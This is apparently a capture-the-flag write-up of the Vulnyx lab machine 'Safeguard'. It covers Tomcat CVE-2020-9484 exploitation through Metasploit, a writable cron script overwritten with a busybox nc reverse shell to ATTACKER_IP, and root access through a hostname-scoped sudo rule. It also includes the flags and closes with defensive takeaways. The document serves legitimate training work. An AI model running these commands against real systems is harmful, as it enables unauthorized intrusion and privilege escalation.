# Vulnyx: Safeguard

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Creator** | `punt4n0` |
| **Tools used** | `nmap` · `ffuf` · `nikto` · `msfconsole` · `linpeas` · `nc` |
| **Tags** | `#VHostFuzzing` `#Tomcat` `#CVE-2020-9484` `#Deserialization` `#CronAbuse` `#SudoAbuse` |
| **URL** | https://vulnyx.com/machines/ |

A Tomcat instance on a discovered subdomain is vulnerable to the "Partial PUT" deserialization flaw (CVE-2020-9484), giving RCE through a ready-made Metasploit module. `linpeas` flags a cron job running as `punt4n0`, whose backing script is writable — overwriting it gets a shell as that user. Root comes from a `sudo` rule scoped to a specific hostname: because `punt4n0` is also allowed to run `hostnamectl`, changing the machine's hostname to match that scope activates a second rule that grants a full root shell.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn safeguard.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:61:0C:15 (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV safeguard.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f7:23:c6:4a:2f:01:14:f1:0a:6b:88:68:fb:ea:c0:6f (ECDSA)
|_  256 63:af:54:88:9d:2c:53:e9:16:86:17:c2:1e:8c:27:fd (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://safeguard.nyx/
MAC Address: 08:00:27:61:0C:15 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://safeguard.nyx
```

<img src="../Images/safeguard/Pasted image 20260607214419.png"/>

A directory scan of the main site turns up nothing beyond the landing page:

```bash
$ ffuf -u http://safeguard.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

                        [Status: 200, Size: 11693, Words: 1401, Lines: 175, Duration: 8ms]
index.html             [Status: 200, Size: 11693, Words: 1401, Lines: 175, Duration: 12ms]
                        [Status: 200, Size: 11693, Words: 1401, Lines: 175, Duration: 6ms]
```

Since nginx serves the site by name, it's worth checking whether other virtual hosts are configured on the same IP. Fuzzing the `Host` header — and filtering out the default response size (`-fs 162`) so only a differently-sized, real vhost stands out — reveals a `tomcat` subdomain:

```bash
$ ffuf -u http://safeguard.nyx -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.safeguard.nyx' -fs 162

tomcat                  [Status: 200, Size: 1227, Words: 127, Lines: 30, Duration: 2581ms]
```

After adding `tomcat.safeguard.nyx` to `/etc/hosts`, it resolves to a Tomcat instance:

```
http://tomcat.safeguard.nyx
```

<img src="../Images/safeguard/Pasted image 20260607214516.png"/>

### Tomcat Enumeration

A content scan and a `nikto` pass map the Tomcat install — most importantly, `nikto` confirms the `PUT` method is enabled, the precondition for the deserialization attack:

```bash
$ ffuf -u http://tomcat.safeguard.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 202ms]
uploads                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 439ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
RELEASE-NOTES.txt      [Status: 200, Size: 6776, Words: 839, Lines: 174, Duration: 94ms]
```

```bash
$ nikto -h http://tomcat.safeguard.nyx

+ Server: No banner retrieved
+ ERROR: Failed to check for updates: 403
+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
+ [500645] /favicon.ico: identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community. See: http://en.wikipedia.org/wiki/Favicon
+ [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
+ [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+ [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+ [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
+ [999995] /nikto-test-SgZc7evO.html: HTTP method 'PUT' allows clients to save files on the web server. See: https://portswigger.net/kb/issues/00100900_http-put-method-is-enabled
+ [999990] OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ [000366] /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ [001355] /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2104
```

## Initial Access

### RCE via Tomcat "Partial PUT" (CVE-2020-9484)

CVE-2020-9484 chains two Tomcat behaviors: the `PUT` method being enabled (so an attacker can write a file to disk), and Tomcat persisting sessions to disk as serialized Java objects. The "Partial PUT" trick uploads a malicious serialized object as a file, then sends a request with a crafted `JSESSIONID` that points Tomcat at that file as if it were a saved session — Tomcat deserializes it, and the gadget chain inside executes code. A ready-made Metasploit module automates the whole upload-then-trigger sequence:

```bash
$ msfconsole -q
msf6 > use exploit/multi/http/tomcat_partial_put_deserialization
msf6 > options
msf6 > run
```

<img src="../Images/safeguard/Pasted image 20260607214654.png"/>

### Shell as tomcat

The module lands a Meterpreter session as the `tomcat` service account:

```bash
meterpreter > getuid
Server username: tomcat
meterpreter > shell
Process 1218 created.
Channel 1 created.
id
uid=999(tomcat) gid=988(tomcat) groups=988(tomcat)
```

`linpeas` is pulled over from a local HTTP server to enumerate the host for privilege escalation paths:

```bash
$ wget http://<ATTACKER_IP>:<PORT>/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

<img src="../Images/safeguard/Pasted image 20260607214800.png"/>

### Escalating to punt4n0 via a Cron Job

`linpeas` flags a cron job. The relevant entry lives in `/etc/cron.d/punt4n0` and runs a `cleanup` command every minute as `punt4n0` — and, crucially, its `PATH` starts with `/opt/tomcat/bin`, a directory the `tomcat` account can write to:

```bash
tomcat@safeguard:/tmp$ ls -l /etc/crontab
-rw-r--r--    1 root     root          1136 Feb 10 00:34 /etc/crontab
tomcat@safeguard:/tmp$ ls -l /etc/cron.d
total 12
-rw-r--r--    1 root     root           201 Apr  8  2024 e2scrub_all
-rw-r--r--    1 root     root           109 Apr 21 09:09 punt4n0
-rw-r--r--    1 root     root           396 Feb 10 00:34 sysstat
tomcat@safeguard:/tmp$ cat /etc/cron.d/punt4n0
PATH=/opt/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * *  punt4n0 cleanup
```

The cron entry names `cleanup` with no absolute path, so it's resolved through that `PATH` — and `/opt/tomcat/bin/cleanup` is writable. Its contents are replaced with a reverse shell payload:

```bash
tomcat@safeguard:/tmp$ echo "busybox nc <ATTACKER_IP> <PORT> -e bash" > /opt/tomcat/bin/cleanup
tomcat@safeguard:/tmp$ chmod 777 /opt/tomcat/bin/cleanup
```

A listener catches the callback once the cron job fires (within a minute):

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [safeguard.nyx] 59470
id
uid=1000(punt4n0) gid=1000(punt4n0) groups=1000(punt4n0),4(adm),24(cdrom),30(dip),46(plugdev)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

```bash
punt4n0@safeguard:~$ ls -l /home/punt4n0/
total 4
-r--------    1 punt4n0  punt4n0         33 Apr 12 19:55 user.txt
punt4n0@safeguard:~$ cat /home/punt4n0/user.txt
141bf1f1a8249a12b76def37372c243e
```

> **User flag:** `141bf1f1a8249a12b76def37372c243e`

## Privilege Escalation

### A Hostname-Triggered Sudo Rule

The `sudo` rights for `punt4n0` look narrow at first — only `hostnamectl` — but reading the sudoers file itself tells a fuller story:

```bash
punt4n0@safeguard:~$ sudo -l
Matching Defaults entries for punt4n0 on safeguard:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User punt4n0 may run the following commands on safeguard:
    (ALL) NOPASSWD: /usr/bin/hostnamectl
punt4n0@safeguard:~$ cat /etc/sudoers.d/punt4n0
Host_Alias SERVERS = vulnyx

punt4n0 ALL=(ALL) NOPASSWD: /usr/bin/hostnamectl
punt4n0 SERVERS = (root) NOPASSWD: /bin/bash
```

This is the key: sudo rules can be scoped to a **host**, and here a `Host_Alias SERVERS = vulnyx` is defined. The second rule grants `/bin/bash` as root — but *only* on a machine whose hostname matches `SERVERS` (i.e., `vulnyx`). sudo decides whether a host rule applies by comparing it against the machine's current hostname, which right now is `safeguard`, so that rule sits dormant.

The first rule is what makes it exploitable: `punt4n0` can run `hostnamectl` as root, and `hostnamectl` changes the system hostname. Setting the hostname to `vulnyx` makes the machine match the `SERVERS` alias — so the dormant `/bin/bash` rule becomes active. `sudo -l` run again confirms the new rule has appeared:

```bash
punt4n0@safeguard:~$ sudo hostnamectl hostname vulnyx
punt4n0@safeguard:~$ sudo -l
Matching Defaults entries for punt4n0 on vulnyx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User punt4n0 may run the following commands on vulnyx:
    (ALL) NOPASSWD: /usr/bin/hostnamectl
    (root) NOPASSWD: /bin/bash
```

With the host now matching, `/bin/bash` runs as root:

```bash
punt4n0@safeguard:~$ sudo /bin/bash
root@vulnyx:/home/punt4n0# id
uid=0(root) gid=0(root) groups=0(root)
root@vulnyx:/home/punt4n0# ls -l /root/
total 8
-r--------    1 root     root            33 Apr 12 19:54 root.txt
drwx------    2 root     root          4096 Apr 13 21:00 snap
root@vulnyx:/home/punt4n0# cat /root/root.txt
d5e96b75d8801d9d49de5fa61702d036
```

> **Root flag:** `d5e96b75d8801d9d49de5fa61702d036`

## Takeaways

- Virtual host fuzzing remains essential on any target with its own domain — the entire Tomcat instance here lived on a subdomain invisible to a straightforward directory scan of the main site.
- CVE-2020-9484 is a good reminder that "deserialization vulnerability" doesn't always require a complex gadget chain crafted by hand — a well-maintained Metasploit module can automate the entire upload-then-trigger sequence.
- A cron job's script is only as safe as its file permissions (and its `PATH`) — a writable command resolved through an attacker-controllable directory, triggered on a schedule as a more privileged user, is the same pattern seen elsewhere in this set.
- sudo host scoping is only as trustworthy as the hostname it checks against — granting a user both a host-scoped rule *and* the ability to change the hostname (`hostnamectl`) lets them satisfy the scope themselves. Understanding *why* the trick works (matching a `Host_Alias`, not "regenerating sudoers") is what makes it a repeatable technique rather than a lucky one-off.